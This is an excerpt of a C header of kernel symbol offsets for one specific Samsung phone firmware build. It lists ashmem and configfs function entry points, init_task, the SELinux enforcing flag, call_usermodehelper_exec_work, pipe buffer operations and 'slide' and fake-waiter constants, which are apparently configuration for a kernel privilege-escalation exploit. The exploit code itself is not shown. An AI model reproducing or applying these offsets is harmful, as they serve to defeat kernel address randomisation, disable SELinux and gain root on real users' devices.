...
#define BUILD_VARIANT_LABEL "r0q_taro_v5.10"
#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT "samsung/r0qcsx/r0q:14/UP1A.231005.007/S901WVLS4DWL3:user/release-keys"
#endif
...
#define ASHMEM_MISC_FOPS_OFF 0x026ca9d0ULL   /* &ashmem_misc.fops */
#define ASHMEM_FOPS_OFF      0x02067d90ULL   /* &ashmem_fops           */

/* Function addresses (raw entry points) */
#define ASHMEM_IOCTL_OFF         0x010f8568ULL   /* ashmem_ioctl           */
#define ASHMEM_COMPAT_IOCTL_OFF  0x010f9034ULL   /* compat_ashmem_ioctl    */
#define ASHMEM_MMAP_OFF          0x010f908cULL   /* ashmem_mmap            */
#define ASHMEM_OPEN_OFF          0x010f92bcULL   /* ashmem_open            */
#define ASHMEM_RELEASE_OFF       0x010f9354ULL   /* ashmem_release         */
#define ASHMEM_SHOW_FDINFO_OFF   0x010f9470ULL   /* ashmem_show_fdinfo     */
 ...
 */
#define CONFIGFS_READ_ITER_OFF      0x005fc998ULL   /* configfs_read_file      */
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x005fd324ULL   /* configfs_write_bin_file */

#define COPY_SPLICE_READ_OFF  0x00531d40ULL   /* generic_file_splice_read */
#define NOOP_LLSEEK_OFF       0x004bcf68ULL   /* noop_llseek              */

/* ---- Kernel data objects ---- */
#define INIT_TASK_OFF           0x0257c1c0ULL   /* init_task           */
#define ROOT_TASK_GROUP_OFF     0x02778040ULL   /* root_task_group     */
...
#define SELINUX_ENFORCING_OFF   0x028a9a70ULL   /* selinux_state.enforcing */
#define KMALLOC_CACHES_OFF      0x020a9ae0ULL   /* kmalloc_caches      */
#define ANON_PIPE_BUF_OPS_OFF   0x01eee9a8ULL   /* anon_pipe_buf_ops   */
...
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x00107ba8ULL   /* GDB: &call_usermodehelper_exec_work - KIMAGE_TEXT_BASE */
#define SYSTEM_UNBOUND_WQ_OFF 0x02569e08ULL               /* GDB: &system_unbound_wq - KIMAGE_TEXT_BASE */
...
#define ASHMEM_IOCTL_JT_OFF           0x010f8568ULL   /* -> ashmem_ioctl            */
#define ASHMEM_COMPAT_IOCTL_JT_OFF    0x010f9034ULL   /* -> compat_ashmem_ioctl     */
#define ASHMEM_MMAP_JT_OFF            0x010f908cULL   /* -> ashmem_mmap             */
#define ASHMEM_OPEN_JT_OFF            0x010f92bcULL   /* -> ashmem_open             */
#define ASHMEM_RELEASE_JT_OFF         0x010f9354ULL   /* -> ashmem_release          */
#define ASHMEM_SHOW_FDINFO_JT_OFF     0x010f9470ULL   /* -> ashmem_show_fdinfo      */
#define ASHMEM_LLSEEK_JT_OFF          0x010f83c8ULL   /* real table .llseek (ashmem_llseek) */
#define CONFIGFS_READ_FILE_JT_OFF       0x005fc998ULL /* -> configfs_read_file      */
#define CONFIGFS_WRITE_BIN_FILE_JT_OFF  0x005fd324ULL /* -> configfs_write_bin_file */
#define NOOP_LLSEEK_JT_OFF            0x004bcf68ULL   /* -> noop_llseek             */
#define CALL_USERMODEHELPER_EXEC_WORK_JT_OFF 0x00107ba8ULL /* -> call_usermodehelper_exec_work */
 ...
 */
#define SLIDE_FAKE_WAITER_PRIO   1
...
#define SLIDE_NFULNL_LOGGER_OFF        0x02571460ULL
#define SLIDE_LOGGERS_0_1_OFF          0x02571390ULL   /* &loggers[0][1] */
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF  0x0268ad78ULL   /* &random_table[4].data */
#define SLIDE_INIT_TASK_OFF            INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF      ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF        0x0294884dULL   /* sysctl_bootid buffer */
 ...
 */
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x00111fd0ULL   /* worker_thread+1368 ret addr after bl schedule */
